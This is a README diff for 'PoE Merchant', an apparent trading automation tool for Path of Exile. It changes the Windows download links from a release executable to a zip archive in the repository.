@@ -1,5 +1,5 @@
 # ![alt text](https://user-images.githubusercontent.com/45703525/89988517-52bcf680-dc88-11ea-9ae6-f7e4b09cf850.png) PoE Merchant
-[Download for Windows](https://github.com/Abaxoth/PoeMerchant/releases/download/1.2.2.2/Poe.Merchant.exe)<br/>
+[Download for Windows](https://github.com/Abaxoth/PoeMerchant/blob/master/Poe%20Merchant.zip)<br/>
 [View on YouTube](https://www.youtube.com/watch?v=mz2RshLC5_8)<br/>
 
 This is a trading automation application for Path of Exile.<br/>
@@ -29,5 +29,5 @@ We have increased ease of use, expanded capabilities, and optimized market analy
 </p>
 
 # Coming Soon
-We are planning to add more options for trading automation. Get started now [Download for Windows](https://github.com/Abaxoth/PoeMerchant/releases/download/1.2.2.2/Poe.Merchant.exe)
+We are planning to add more options for trading automation. Get started now [Download for Windows](https://github.com/Abaxoth/PoeMerchant/blob/master/Poe%20Merchant.zip)
 
